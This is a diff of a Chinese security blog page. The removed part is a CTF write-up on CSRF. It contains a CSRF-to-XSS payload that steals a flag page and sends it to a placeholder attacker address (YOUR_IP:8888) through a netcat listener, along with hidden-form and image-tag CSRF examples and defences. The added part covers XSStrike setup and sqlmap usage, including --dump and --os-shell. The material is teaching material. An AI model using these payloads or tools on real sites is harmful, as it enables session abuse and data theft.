@@ -71,119 +71,41 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-CSRF/CSRF攻击实战案例" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-Web/工具使用/xsstrike" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2025/05/20/CSRF/CSRF%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T06:28:00.000Z" itemprop="datePublished">2025-05-20</time>
+    <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
 </a>
     
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>►<a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B/">实战案例</a>
-  </div>
-
   </div>
   <div class="article-inner">
     
     
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/05/20/CSRF/CSRF%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B/">CSRF攻击实战案例</a>
-    </h1>
-  
-
-      </header>
-    
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="CSRF攻击实战案例"><a href="#CSRF攻击实战案例" class="headerlink" title="CSRF攻击实战案例"></a>CSRF攻击实战案例</h1><p>下面是一份示例代码，展示了如何利用 CSRF 触发反射型 XSS，然后 fetch() 页面获取 flag 内容并发送到攻击者服务器：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF-to-XSS Exfiltration<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Triggering CSRF-to-XSS Attack<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Construct the XSS payload. Dynamically split the closing tag to avoid premature termination.</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> payload = <span class="string">`&lt;scr`</span> + <span class="string">`ipt&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">      // Use fetch() to retrieve the homepage which includes the flag (after admin&#x27;s draft is published)</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">      fetch(&quot;http://challenge.localhost/&quot;, &#123; credentials: &quot;include&quot; &#125;)</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        .then(response =&gt; response.text())</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        .then(data =&gt; &#123;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">          // Exfiltrate the data to the attacker&#x27;s server. Replace YOUR_IP:8888 with your attacker&#x27;s address.</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">          var exfilUrl = &quot;http://YOUR_IP:8888/?flag=&quot; + encodeURIComponent(data);</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">          new Image().src = exfilUrl;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        &#125;)</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        .catch(error =&gt; console.error(&quot;Fetch error:&quot;, error));</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">    &lt;/scr`</span> + <span class="string">`ipt&gt;`</span>;</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// URL-encode the payload so it can be safely passed as a parameter</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> encodedPayload = <span class="built_in">encodeURIComponent</span>(payload);</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Build the target URL using the /ephemeral endpoint which reflects the msg parameter</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> targetUrl = <span class="string">&quot;http://challenge.localhost/ephemeral?msg=&quot;</span> + encodedPayload;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Create an invisible iframe to force admin&#x27;s browser to load the target URL and execute our payload</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;iframe&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    iframe.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;none&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    iframe.<span class="property">src</span> = targetUrl;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(iframe);</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+        <h1 id="xsstrike"><a href="#xsstrike" class="headerlink" title="xsstrike"></a>xsstrike</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/s0md3v/XSStrike.git</span><br></pre></td></tr></table></figure>
 
-<p><strong>部署步骤：</strong></p>
-<ol>
-<li><p>将上述代码保存为 <code>index.html</code>​，并将 <code>YOUR_IP:8888</code>​ 替换成你攻击机的实际 IP 和监听端口。</p>
+<h3 id="方法-1：创建软链接到系统路径（推荐）"><a href="#方法-1：创建软链接到系统路径（推荐）" class="headerlink" title="方法 1：创建软链接到系统路径（推荐）"></a><strong>方法 1：创建软链接到系统路径（推荐）</strong></h3><ol>
+<li><p><strong>确保脚本可执行</strong></p>
+ <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x /path/to/xsstrike.py  <span class="comment"># 赋予执行权限</span></span><br></pre></td></tr></table></figure>
+<p> <em>如果脚本第一行没有 Shebang（如</em>  <em>​<code>#!/usr/bin/env python3</code>​</em>​ <em>），需手动添加。</em></p>
 </li>
-<li><p>在你的攻击机上启动一个 HTTP 服务器，例如：</p>
-<p> ​<code>python3 -m http.server 1337</code>​</p>
-<p> 使恶意页面可通过 <code>http://hacker.localhost:1337/</code>​ 访问。</p>
-</li>
-<li><p>启动一个监听服务器（例如使用 netcat）：</p>
-<p> ​<code>nc -l -p 8888 -v</code>​</p>
-</li>
-<li><p>使用 victim 工具触发 admin 访问你的恶意页面：</p>
-<p> ​<code>/challenge/victim http://hacker.localhost:1337/</code>​</p>
-</li>
-<li><p>管理员的浏览器加载页面后，会通过 CSRF 触发反射型 XSS，进而执行 fetch() 请求，获取包含 flag 的页面内容，并通过 Image() 将数据 exfiltrate 到你的监听服务器。</p>
-</li>
-<li><p>检查 netcat 输出，从 exfiltrated 数据中提取出 flag。</p>
+<li><p><strong>创建软链接到</strong>  <strong>​<code>/usr/local/bin</code>​</strong>​</p>
+ <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">ln</span> -s /path/to/xsstrike.py /usr/local/bin/xsstrike</span><br></pre></td></tr></table></figure>
+<ul>
+<li>​<code>/usr/local/bin</code>​ 是用户级全局命令的标准路径，无需修改 <code>PATH</code>​ 变量。</li>
+<li>完成后，任意位置输入 <code>xsstrike</code>​ 即可运行脚本。</li>
+</ul>
 </li>
 </ol>
-<p>‍</p>
-<h3 id="三、CTF-中的-CSRF-实战案例"><a href="#三、CTF-中的-CSRF-实战案例" class="headerlink" title="三、CTF 中的 CSRF 实战案例"></a>三、CTF 中的 CSRF 实战案例</h3><p>在 CTF 竞赛中，题目往往会设计一个脆弱的 Web 应用程序，让参赛者利用 CSRF 发起请求。一个典型的场景如下：</p>
-<ul>
-<li><strong>目标应用（pwnpost）：</strong><br>管理员的 flag 隐藏在草稿帖子中，只有在发布后才会完整显示。管理员默认不会发布草稿。</li>
-<li><strong>攻击思路：</strong><br>利用 CSRF 诱使管理员浏览器发起一个 POST 请求到 <code>/publish</code>​，将草稿帖子发布。由于管理员的页面对草稿做了部分隐藏，所以发布后 flag 会完整显示。</li>
-<li><strong>利用 CSRF-to-XSS 链：</strong><br>由于直接窃取 HttpOnly cookie 不可行，攻击者可以利用 CSRF 触发一个反射型 XSS 漏洞，从而在管理员浏览器中执行 JavaScript。该 JavaScript 使用 fetch() 请求目标页面，获取 flag 内容，再通过其他手段（例如 Image() 对象） exfiltrate 数据到攻击者服务器。</li>
-</ul>
-<p>‍</p>
-<blockquote>
-<p>跨站请求伪造（Cross-Site Request Forgery，简称 CSRF）是一种针对 Web 应用程序的攻击方式。通过 CSRF，攻击者诱导受害者在不知情的情况下，以受害者的身份执行非本意的操作。本文将详细介绍 CSRF 的基本原理、常见攻击方式、在 CTF 中的实战案例，以及如何防御 CSRF 攻击。</p>
-</blockquote>
-<h3 id="一、CSRF-的基本原理"><a href="#一、CSRF-的基本原理" class="headerlink" title="一、CSRF 的基本原理"></a>一、CSRF 的基本原理</h3><p><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=CSRF%20%E6%94%BB%E5%87%BB&spm=1001.2101.3001.7020">CSRF 攻击</a>的核心思想是：<br><strong>如果受害者已经登录某个网站，那么攻击者可以诱使受害者的浏览器在后台自动发送请求，这个请求会自动携带受害者的身份验证信息（如 Cookie），从而导致非本意的操作。</strong></p>
-<h4 id="1-1-浏览器与-Cookie-的关系"><a href="#1-1-浏览器与-Cookie-的关系" class="headerlink" title="1.1 浏览器与 Cookie 的关系"></a>1.1 浏览器与 Cookie 的关系</h4><ul>
-<li><p><strong>Cookie 自动携带：</strong><br>当用户在浏览器中登录某个网站时，服务器会通过 Set-Cookie 将身份验证数据（如 SessionID）存储到浏览器中。以后，浏览器在访问同一网站时会自动带上这些 Cookie，无需用户额外操作。</p>
-</li>
-<li><p><strong>同源策略（SOP）：</strong><br>浏览器通过同源策略来限制脚本访问其它域的数据，但对于跨站表单提交（如 GET 或 POST 请求），浏览器会自动携带 Cookie。CSRF 就正是利用这一特点来伪造请求。</p>
-</li>
-</ul>
-<h4 id="1-2-CSRF-攻击流程"><a href="#1-2-CSRF-攻击流程" class="headerlink" title="1.2 CSRF 攻击流程"></a>1.2 CSRF 攻击流程</h4><ol>
-<li><p><strong>受害者登录：</strong><br> 受害者在目标网站（例如银行、论坛等）登录后，浏览器中保存了有效的 Cookie 和会话信息。</p>
-</li>
-<li><p><strong>攻击者构造恶意页面：</strong><br> 攻击者在自己控制的网站上（例如 hacker.localhost）制作一个恶意页面，该页面中嵌入了指向目标网站的请求。常见的方式包括使用隐藏的 HTML 表单、图片标签或 iframe 等。</p>
-</li>
-<li><p><strong>诱导受害者访问恶意页面：</strong><br> 攻击者通过钓鱼邮件、链接分享或其它方式诱导受害者访问恶意页面。当受害者访问时，浏览器会自动向目标网站发送请求，并携带受害者的 Cookie。</p>
-</li>
-<li><p><strong>目标网站执行操作：</strong><br> 由于请求中包含了合法的 Cookie，目标网站认为这是受害者本人发出的请求，从而执行敏感操作，如转账、修改密码、发布消息等。</p>
-</li>
-</ol>
-<p>‍</p>
-<h3 id="二、CSRF-攻击的常见方式"><a href="#二、CSRF-攻击的常见方式" class="headerlink" title="二、CSRF 攻击的常见方式"></a>二、CSRF 攻击的常见方式</h3><h4 id="2-1-隐藏表单自动提交"><a href="#2-1-隐藏表单自动提交" class="headerlink" title="2.1 隐藏表单自动提交"></a>2.1 隐藏表单自动提交</h4><p>攻击者在恶意页面中构造一个隐藏的 HTML 表单，并使用 JavaScript 自动提交。</p>
-<p>示例代码：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;csrfForm&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://targetsite.com/transfer&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- 隐藏字段，如果目标接口需要参数 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;to_account&quot;</span> <span class="attr">value</span>=<span class="string">&quot;attacker_account&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;csrfForm&#x27;</span>).<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>这种方式依赖于浏览器自动提交表单，并且不会受到同源策略的限制，因为表单提交会自动携带 Cookie。</p>
-<h4 id="2-2-利用图片或-iframe"><a href="#2-2-利用图片或-iframe" class="headerlink" title="2.2 利用图片或 iframe"></a>2.2 利用图片或 iframe</h4><p>攻击者利用 <code>&lt;img&gt;</code>​ 或 <code>&lt;iframe&gt;</code>​ 标签触发 GET 请求。例如：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 触发 GET 请求，自动携带 Cookie --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://targetsite.com/delete_account?user=admin&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>或使用 iframe：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://targetsite.com/perform_action?param=value&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="2-3-JavaScript-触发重定向"><a href="#2-3-JavaScript-触发重定向" class="headerlink" title="2.3 JavaScript 触发重定向"></a>2.3 JavaScript 触发重定向</h4><p>在受害者浏览器中使用 JavaScript 重定向到目标 URL，例如：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&quot;http://targetsite.com/perform_action?param=value&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>这种方式也会自动携带受害者的 Cookie，从而完成 CSRF 攻击。</p>
-<p>‍</p>
-<h3 id="四、防御措施"><a href="#四、防御措施" class="headerlink" title="四、防御措施"></a>四、防御措施</h3><p>为了防止 CSRF 攻击，常用的防御措施包括：</p>
-<ul>
-<li><strong>CSRF Token:</strong><br>在敏感表单中加入一个随机生成的 token，并在服务器端进行校验，确保请求来源正确。</li>
-<li><strong>SameSite Cookie 属性：</strong><br>设置 Cookie 的 SameSite 属性（如 SameSite&#x3D;Lax 或 SameSite&#x3D;Strict），可以有效减少跨站请求中 Cookie 被自动发送的风险。</li>
-<li><strong>双重验证:</strong><br>对于关键操作，要求用户在执行操作时进行额外确认（如验证码、短信验证等）。</li>
-<li><strong>CSP（Content Security Policy）：</strong><br>限制外部脚本的加载，有助于降低 XSS 攻击风险，但对于 CSRF 攻击防护效果有限。</li>
-</ul>
-<p>‍</p>
-<h3 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h3><p>CSRF 攻击利用浏览器自动携带 Cookie 的特点，让受害者在不知情的情况下执行敏感操作。在 CTF 竞赛中，题目往往会设计场景，让参赛者通过 CSRF 触发反射型 XSS，从而获取管理员页面中的 flag。<br>本文详细介绍了 CSRF 攻击的原理、常见方式以及一个实战案例，并讨论了如何防御此类攻击。</p>
-<p>理解并掌握 CSRF 攻击有助于你在 CTF 中快速识别并利用漏洞，同时也能提高你对 Web 安全防护措施的理解。</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/CSRF/CSRF%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B/" data-id="cmawa28nb000b847kawucag31" data-title="CSRF攻击实战案例" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/" data-id="cmawal1j6001qbo7k73u6gh23" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CSRF/" rel="tag">CSRF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li></ul>
-
     </footer>
   </div>
   
@@ -192,167 +114,721 @@
 
 
   
-    <article id="post-CSRF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-Web/工具使用/sqlmap" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2025/05/20/CSRF/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T06:27:00.000Z" itemprop="datePublished">2025-05-20</time>
+    <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
 </a>
     
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
-  </div>
-
   </div>
   <div class="article-inner">
     
     
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/05/20/CSRF/">CSRF攻击详解</a>
-    </h1>
-  
-
-      </header>
-    
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="一、什么是CSRF"><a href="#一、什么是CSRF" class="headerlink" title="一、什么是CSRF?"></a>一、什么是CSRF?</h2><blockquote>
-<p>CSRF (Cross-site request forgery，跨站请求伪造)也被称为One Click Attack或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本(XSS)，但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户请求受信任的网站。</p>
-<p>简单的说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己以前认证过的站点并运行一些操作（如发邮件，发消息，甚至财产操作（如转账和购买商品））。因为浏览器之前认证过，所以被访问的站点会觉得这是真正的用户操作而去运行。</p>
-</blockquote>
-<p>[内容继续…]</p>
-<h1 id="CSRF-1"><a href="#CSRF-1" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="一、什么是CSRF-1"><a href="#一、什么是CSRF-1" class="headerlink" title="一、什么是CSRF?"></a>一、什么是CSRF?</h2><blockquote>
-<p>CSRF (Cross-site request forgery，跨站请求伪造)也被称为One Click Attack或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本(XSS)，但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户请求受信任的网站。</p>
-<p>简单的说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己以前认证过的站点并运行一些操作（如发邮件，发消息，甚至财产操作（如转账和购买商品））。因为浏览器之前认证过，所以被访问的站点会觉得这是真正的用户操作而去运行。</p>
-</blockquote>
-<h2 id="二、CSRF攻击原理及过程"><a href="#二、CSRF攻击原理及过程" class="headerlink" title="二、CSRF攻击原理及过程"></a>二、<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=CSRF%E6%94%BB%E5%87%BB&spm=1001.2101.3001.7020">CSRF攻击</a>原理及过程</h2><blockquote>
-<p>CSRF为什么能够攻击成功?</p>
-<p>其本质原因是重要操作的所有参数都是可以被攻击者猜测到的。</p>
-<p>攻击者只有预测出URL的所有参数与参数值，才能成功地构造一个伪造的请求;反之，攻击者将无法攻击成功。</p>
-</blockquote>
-<p><img src="/.com//image-20250520024626-zm1u5u8.png" alt="image"></p>
-<p>从上图能够看出，要完毕一次CSRF攻击，受害者必须依次完毕两个步骤：</p>
-<blockquote>
-<pre><code>    登录受信任站点A，并在本地生成Cookie。
+        <h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><p>同样windows下只能借助python启动，太麻烦了，我选择使用kali</p>
+<h2 id="基本使用方法"><a href="#基本使用方法" class="headerlink" title="基本使用方法"></a>基本使用方法</h2><h3 id="1-检测注入点"><a href="#1-检测注入点" class="headerlink" title="1. 检测注入点"></a>1. 检测注入点</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://example.com/page.php?id=1&quot;</span></span><br></pre></td></tr></table></figure>
 
-    在不登出A的情况下，访问危急站点B。
+<h3 id="2-获取数据库信息"><a href="#2-获取数据库信息" class="headerlink" title="2. 获取数据库信息"></a>2. 获取数据库信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://example.com/page.php?id=1&quot;</span> --dbs</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-获取当前数据库"><a href="#3-获取当前数据库" class="headerlink" title="3. 获取当前数据库"></a>3. 获取当前数据库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://example.com/page.php?id=1&quot; --current-db</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h2 id="常用参数详解"><a href="#常用参数详解" class="headerlink" title="常用参数详解"></a>常用参数详解</h2><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>​<code>-u</code>​</td>
+<td>指定目标URL</td>
+<td>​<code>-u &quot;http://example.com/page.php?id=1&quot;</code>​</td>
+</tr>
+<tr>
+<td>​<code>--data</code>​</td>
+<td>POST数据</td>
+<td>​<code>--data=&quot;user=admin&amp;pass=123&quot;</code>​</td>
+</tr>
+<tr>
+<td>​<code>--cookie</code>​</td>
+<td>设置Cookie</td>
+<td>​<code>--cookie=&quot;PHPSESSID=123&quot;</code>​</td>
+</tr>
+<tr>
+<td>​<code>--level</code>​</td>
+<td>测试等级(1-5)</td>
+<td>​<code>--level=3</code>​</td>
+</tr>
+<tr>
+<td>​<code>--risk</code>​</td>
+<td>风险等级(1-3)</td>
+<td>​<code>--risk=2</code>​</td>
+</tr>
+<tr>
+<td>​<code>--dbs</code>​</td>
+<td>枚举数据库</td>
+<td>​<code>--dbs</code>​</td>
+</tr>
+<tr>
+<td>​<code>-D</code>​</td>
+<td>指定数据库</td>
+<td>​<code>-D testdb</code>​</td>
+</tr>
+<tr>
+<td>​<code>--tables</code>​</td>
+<td>枚举表</td>
+<td>​<code>--tables</code>​</td>
+</tr>
+<tr>
+<td>​<code>-T</code>​</td>
+<td>指定表</td>
+<td>​<code>-T users</code>​</td>
+</tr>
+<tr>
+<td>​<code>--columns</code>​</td>
+<td>枚举列</td>
+<td>​<code>--columns</code>​</td>
+</tr>
+<tr>
+<td>​<code>-C</code>​</td>
+<td>指定列</td>
+<td>​<code>-C username,password</code>​</td>
+</tr>
+<tr>
+<td>​<code>--dump</code>​</td>
+<td>导出数据</td>
+<td>​<code>--dump</code>​</td>
+</tr>
+<tr>
+<td>​<code>--os-shell</code>​</td>
+<td>获取操作系统shell</td>
+<td>​<code>--os-shell</code>​</td>
+</tr>
+<tr>
+<td>​<code>--proxy</code>​</td>
+<td>使用代理</td>
+<td>​<code>--proxy=&quot;http://127.0.0.1:8080&quot;</code>​</td>
+</tr>
+<tr>
+<td>​<code>--threads</code>​</td>
+<td>线程数</td>
+<td>​<code>--threads=5</code>​</td>
+</tr>
+<tr>
+<td>​<code>--batch</code>​</td>
+<td>自动选择默认选项</td>
+<td>​<code>--batch</code>​</td>
+</tr>
+</tbody></table>
+<p>‍</p>
+<h2 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h2><h3 id="1-POST请求注入"><a href="#1-POST请求注入" class="headerlink" title="1. POST请求注入"></a>1. POST请求注入</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://example.com/login.php&quot;</span> --data=<span class="string">&quot;username=admin&amp;password=123&quot;</span></span><br></pre></td></tr></table></figure>
+
